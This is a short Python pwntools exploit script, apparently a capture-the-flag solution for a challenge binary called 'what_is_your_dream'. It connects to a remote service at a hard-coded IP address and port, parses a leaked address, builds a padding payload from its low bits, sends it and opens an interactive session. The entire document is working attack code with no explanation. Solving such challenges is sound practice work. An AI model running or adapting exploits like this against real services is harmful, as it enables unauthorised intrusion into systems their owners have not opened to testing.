from pwn import * 

elf = context.binary = ELF('./what_is_your_dream')
# r = process('./what_is_your_dream')
r = remote('45.122.249.68',10021)
context.log_level = 'info'


print(r.recvuntil(b'gift: '))
leak = int(r.recvline(),16)
print(hex(leak))
print(hex(leak & 0xffff))
pad = 0x10000 - (leak&0xffff)
print(hex(pad))
payload = b'a'*pad + b'Wanna.w^n'
# print(payload)

r.sendlineafter(b'yourself ',payload)
# gdb.attach(r)
r.interactive()